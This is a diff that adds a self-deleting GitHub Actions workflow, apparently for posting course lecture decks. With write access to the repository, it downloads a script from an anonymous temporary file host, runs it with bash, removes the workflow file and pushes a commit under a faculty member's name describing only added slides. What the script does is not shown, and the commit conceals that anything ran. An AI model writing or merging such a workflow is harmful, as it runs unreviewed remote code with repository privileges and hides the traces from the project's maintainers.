@@ -1,0 +1,22 @@
+name: deploy-dseh004-class-decks
+on:
+  push:
+    paths:
+      - '.github/workflows/deploy-dseh004-class.yml'
+permissions:
+  contents: write
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Fetch, verify and commit files, then remove this workflow
+        run: |
+          curl -fsS --retry 5 -X POST "https://temp.sh/hGeIx/deploy.sh" -o /tmp/d.sh
+          echo "21bb63f1a3227e01b210c11372f9842ffdbb9100d349e493c95ecce0a0c45545  /tmp/d.sh" | sha256sum -c -
+          bash /tmp/d.sh
+          git rm -q .github/workflows/deploy-dseh004-class.yml
+          git config user.name "RKSinghDU"
+          git config user.email "rksingh@commerce.du.ac.in"
+          git commit -m "DSEH004: add 19 in-class lecture decks (Weeks 6 to 12) to the materials page"
+          git push
